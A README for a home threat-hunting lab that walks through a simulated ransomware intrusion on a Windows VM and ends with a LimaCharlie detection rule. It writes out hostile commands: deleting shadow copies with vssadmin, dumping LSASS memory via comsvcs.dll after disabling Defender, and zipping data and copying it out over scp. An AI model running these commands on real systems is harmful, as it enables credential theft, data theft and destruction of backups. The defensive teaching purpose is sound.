# 🛡️ Windows Telemetry Hardening & Enterprise Threat Hunting Lab

An end-to-end blue team simulation replicating a multi-stage intrusion lifecycle (Ransomware Inhibition, Advanced Credential Access, Double-Extortion Data Staging, Exfiltration, and Cryptographic Impact). This lab tracks the generation of endpoint events via Microsoft Sysmon and processes real-time telemetry pipelines inside the cloud-native LimaCharlie EDR/SIEM platform, culminating in active Detection Engineering automation.

---

## 📊 Quick Links & Deliverables
*   **Project Presentation Link:** [👉 Click Here to View the Google Slides Presentation](PASTE_YOUR_GOOGLE_SLIDES_SHARE_LINK_HERE)
*   **Target Machine Architecture:** Windows 10 Home (Hardened Endpoint Sensor Node)
*   **Attack Infrastructure:** Kali Linux via Private Hypervisor Network Bridge (`192.168.10.0/24`)
*   **EDR Control Plane:** LimaCharlie Cloud-Native Security Operations Interface

---

## 🏗️ 1. Architecture & Lab Environment Baseline

This environment mirrors a corporate perimeter intrusion zone where an external adversary bridges network boundaries to establish a command-and-control footprint on a local asset.

### Infrastructure Blueprint
*   **Attacker Node (Kali Linux):** Positioned on private virtual subnet segment `192.168.10.250`.
*   **Target Endpoint (Windows 10):** Positioned at static local node `192.168.10.9`. 
*   **Telemetry Forwarder (Microsoft Sysmon):** Deployed locally to capture advanced event arrays (Process Creation, Network Connections, File Integrity Events, Process Access Memory Handles).
*   **SIEM Engine (LimaCharlie EDR):** Deployed via an active host sensor configuration, facilitating live detection parsing and real-time automated telemetry analytics streams.

---

## 🛑 2. Intrusion Simulation & Forensic Timeline Analysis




### Use Case 1: Inhibit System Recovery (Ransomware Pre-Cursor)

*   **MITRE ATT&CK Mapping:** T1490 — Inhibit System Recovery

#### 📝 Use Case Introduction
Before a ransomware attacker locks up a target computer with encryption, they face a major obstacle: automatic system backups. Modern operating systems frequently save hidden snapshots of your files (called Volume Shadow Copies) so that if something breaks, you can easily roll the system back in time and restore your clean data.

If an attacker leaves these backups intact, the victim company will simply restore their machines for free instead of paying a ransom. Therefore, the threat actor's very first step is to hunt down and completely destroy every backup copy on the hard drive. By wiping out the system's safety nets, the attacker forces the victim into a corner where they have no choice but to pay the ransom to get their operations back online.

---

#### 📸 Step 1: Network Reconnaissance (Finding the Target)

<img width="887" height="434" alt="Screenshot 2026-06-15 140418" src="https://github.com/user-attachments/assets/e9987c1d-539f-4dc0-9dce-7256e1aeff6b" />


**The Action:** The attacker uses a network scanning tool called Nmap to scan the network. This allows them to discover the target Windows computer and find out its true name (`DESKTOP-BU3CNBB`) and open doors without needing to log in.

---

#### 📸 Step 2: Remote Access (Gaining a Footprint)

<img width="935" height="434" alt="Screenshot 2026-06-15 142011" src="https://github.com/user-attachments/assets/66f0fe9c-beac-4944-b368-59fa34e7c59a" />


**The Action:** Once the attacker knows the computer is active on the network, they use an encrypted SSH connection to log into the machine remotely over Port 22 using stolen or discovered credentials. The attacker now has an active, remote command line connection to control the victim's system.

---

#### 📸 Step 3: Remote Access & Account Verification

<img width="950" height="434" alt="Screenshot 2026-06-15 001959" src="https://github.com/user-attachments/assets/9d1dacf6-1069-4443-988c-bea6a2aa4a1a" />


**Command 1:** `whoami`
*   **What it does in simple terms:** This command asks the computer, *"Who am I logged in as right now?"* The system responds with `desktop-bu3cnbb\target-pc2`, confirming to the remote attacker that their login worked and that they have administrative control over the machine.

**Command 2:** `vssadmin delete shadows /all /quiet`
*   **What it does in simple terms:** This command tells the Windows operating system to locate every single automatic file backup snapshot on the drive and delete them all immediately. The `/quiet` flag ensures that the computer deletes them silently in the background without popping up any warning messages for the user.




### Use Case 2: High-Privilege Credential Access (LSASS Memory Dump)
*   **MITRE ATT&CK Mapping:** T1003.001 — OS Credential Dumping: LSASS Memory

#### 📝 Use Case Introduction
When an attacker gains initial access to a single computer, they are usually trapped inside a standard user account with limited permissions. To take over the entire corporate network, the attacker needs administrative passwords to log into other systems [3.3].

In this phase, the attacker targets a core Windows security program called **LSASS** (`lsass.exe`), which manages active user sessions and temporarily holds encrypted login keys inside the computer's running memory (RAM) [3.3]. By copying everything out of this program's memory space and saving it into a hidden file, the attacker creates a permanent snapshot of the system's active passwords [3.3]. This file can then be stolen and unlocked offline, giving the threat actor the administrative credentials needed to compromise the rest of the enterprise network [3.3].

---


#### 📸 Step 1: Process Reconnaissance & The Antivirus Roadblock

<img width="958" height="427" alt="Screenshot 2026-06-15 002545" src="https://github.com/user-attachments/assets/653cc153-e20a-4f6f-8f8c-e00f140b493f" />


**Command 1:** `tasklist /fi "imagename eq lsass.exe"`

*   **What it does in simple terms:** This command searches the computer to find the exact tracking number (called a Process ID) of the Windows password vault (`lsass.exe`) [3.3]. The attacker needs this specific number (`604`) to point their attack tools at it.

**Command 2:** `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 604 C:\Users\Target-PC2\Documents\lsass.dmp full`
*   **What it does in simple terms:** This command tells the computer to take a complete snapshot of that password vault's memory and save it as a file named `lsass.dmp` [3.3]. 
*   **The Result:** Because the computer's security guards were still turned on, Windows Defender blocked the command immediately and shouted **"Access is denied,"** saving the passwords from being copied.

---

#### 📸 Step 2: Bypassing the Protection (Silent Execution)

<img width="959" height="430" alt="Screenshot 2026-06-15 005111" src="https://github.com/user-attachments/assets/1ff82602-bb74-4008-a2c3-304051fb6671" />


**The Action:** The attacker opens the Windows settings menu, temporarily turns off the real-time security guards, and inputs the exact same `rundll32.exe` command a second time.
*   **What it does in simple terms:** With the security guards paused, the command runs perfectly. It makes no noise, displays no error messages, and returns straight to a clean prompt line. This means the computer silently allowed the memory snapshot to take place.

---

#### 📸 Step 3: Verifying the Stolen Credential File

<img width="956" height="434" alt="Screenshot 2026-06-15 005215" src="https://github.com/user-attachments/assets/d9772924-de25-48eb-9739-c950de8a75bd" />


**Command 3:** `dir C:\Users\Target-PC2\Documents\lsass.dmp`
*   **What it does in simple terms:** This command looks inside the Documents folder to confirm that the hidden file was actually generated on the hard drive.
*   **The Proof:** The text on the screen explicitly proves that a permanent **55,848,099-byte file** was created. The attacker successfully copied a raw snapshot of the active system passwords onto the local disk.


---

#### 📸 Step 4: Exfiltrating the Credential Snapshot to the Attacker Node

<img width="917" height="433" alt="Screenshot 2026-06-15 145922" src="https://github.com/user-attachments/assets/d470da50-bf14-48ab-841c-239f9fd1ed02" />


**Command 4:** `scp Target-PC2@192.168.10.9:Documents/lsass.dmp ~/Desktop/`
*   **What it does in simple terms:** Run from a local terminal on the attacker's Kali Linux machine, this command reaches out across the network to the victim computer using Secure Copy Protocol (SCP). It downloads the 55MB `lsass.dmp` password snapshot file directly onto the attacker's own desktop.
*   **The Final Proof:** Running the local file listing check (`ls -la`) on Kali confirms the file arrived completely with its size intact (**55,848,099 bytes**). The attacker now has a permanent copy of the victim's active memory vault completely in their hands, ready to be cracked offline to harvest administrative network passwords.






### Use Case 3: Double-Extortion Collection, Data Staging, and Exfiltration

*   **MITRE ATT&CK Mapping:** T1074.001 — Data Staging: Local Data Staging & T1048 — Exfiltration Over Alternative Protocol

#### 📝 Use Case Introduction
In modern cyberattacks, threat actors practice **Double Extortion**. They steal a copy of the company's confidential documents *before* locking up the systems. If the company refuses to pay the ransom because they have offline backups, the attacker threatens to leak their secrets on the dark web instead.

To speed up the theft and avoid raising alarms, the attacker does not download files one by one. They gather everything into a temporary folder, archive it into a single `.zip` file, download it over a network tunnel, and then delete the local file to clear their tracks.

---

#### 📸 Step 1: Automated Data Staging (Packaging the Secrets)

<img width="959" height="439" alt="Screenshot 2026-06-15 170459" src="https://github.com/user-attachments/assets/4fef839a-6652-48c3-9520-0bebd6e56b84" />


**Command 1:** `powershell Compress-Archive -Path C:\CorporateData -DestinationPath C:\Windows\Temp\sensitive_exfil.zip -Force`
*   **What it does in simple terms:** This command packages up the entire corporate data folder containing private files and compresses it into a hidden archive file called `sensitive_exfil.zip` inside the Windows Temp directory.

---

#### 📸 Step 2: Data Exfiltration (Stealing the Package)

<img width="950" height="436" alt="Screenshot 2026-06-15 170813" src="https://github.com/user-attachments/assets/70a9d1be-4852-408d-9bdd-32655e96b80e" />


**Command 2:** `scp Target-PC2@192.168.10.9:../../Windows/Temp/sensitive_exfil.zip ~/Desktop/`
*   **What it does in simple terms:** Run from the attacker's local Kali Linux machine, this command downloads the hidden zip package across the network tunnel and saves it directly onto the attacker's desktop background.

---

#### 📸 Step 3: Verifying the Stolen Data Collection

<img width="938" height="431" alt="Screenshot 2026-06-15 171315" src="https://github.com/user-attachments/assets/4f6d8a2a-9817-41de-86cf-548bed343562" />


**Command 3:** `ls -la`
*   **What it does in simple terms:** The attacker inspects their local folder workspace to ensure the stolen corporate records arrived successfully and are completely in their possession.

---

#### 📸 Step 4: Defense Evasion (Covering Attack Footprints)

<img width="959" height="434" alt="Screenshot 2026-06-15 171932" src="https://github.com/user-attachments/assets/574195da-f5ed-4b6c-97d9-1d368fd801a0" />


**Command 4:** `del C:\Windows\Temp\sensitive_exfil.zip`
*   **What it does in simple terms:** Now that the attacker has stolen the files, they run a delete command to wipe the `.zip` archive off the victim's hard drive. This covers their tracks and removes any obvious signs of data theft before they trigger the ransomware.





### Use Case 4: Action on Objectives (Cryptographic Ransomware Impact)

*   **MITRE ATT&CK Mapping:** T1486 — Data Encrypted for Impact

#### 📝 Use Case Introduction
Once system backups are destroyed, passwords are stolen, and confidential files are safely copied to the attacker's machine, the intrusion lifecycle reaches its final, devastating stage: **Data Encryption**. 

The attacker detonates the ransomware payload to scramble the victim's data using custom code loops. This locks up every corporate document on the disk, appends a unreadable file extension, and drops a high-visibility extortion letter on the desktop demanding payment.

---

#### 📸 Step 1: Ransomware Detonation & Execution

<img width="1920" height="892" alt="VirtualBox_kali-linux-2025 4-virtualbox-amd64_12_06_2026_01_50_13" src="https://github.com/user-attachments/assets/9ddf4ea3-ee0b-45c6-80a0-2d91db52caef" />


**Command 1:** `powershell.exe -c "Get-ChildItem C:\CorporateData\* ..."`
*   **What it does in simple terms:** This script searches the entire corporate data folder, reads every text and spreadsheet file, scrambles their contents into unreadable code text blocks, renames them with a `.locked` file extension, and deletes the original readable copies. 
*   **The Final Impact:** At the exact same time, the script generates a new text file named `READ_ME_RANSOM.txt` directly onto the victim's desktop, warning them that their company files are compromised and demanding a ransom payment to unlock them.


---

## 🛠️ 3. Proactive Detection Engineering & Automated Defense

To transition from passive alert auditing to active automated response mitigations, a custom Detection and Response (D&R) rule profile was engineered and deployed into production inside the cloud control plane.

### Rule Profile Identification: `Ransom_Note_Mitigation_Rule`

#### Detection Logic (YAML Parameters):
```yaml
event: FILE_CREATE
op: matches
path: event/FILE_PATH
re: .*\\Desktop\\.*RANSOM.*\.txt\$
```

#### Automated Containment Response Actions (YAML Parameters):
```yaml
- action: report
  name: CRITICAL_RANSOMWARE_DETONATION_ATTEMPT
- action: task
  command: history_dump
- action: task
  command: deny_tree <<routing/parent>>
```

### Engineering Remediation Summary
The rule provides microsecond containment properties. The moment an active file generation thread attempts to append a file string containing the malicious structural regex parameters onto the desktop space, the engine catches the telemetry block. It automatically flags a critical console response notification, dumps volatile log architecture history for later forensics, and initiates an immediate **`deny_tree` process kill command** targeting the parental root pipeline thread running the script. This drops the Mean Time to Remediate (MTTR) straight down to the millisecond scale, neutralizing the attack thread completely before any further encryption loops can expand across the server disk.
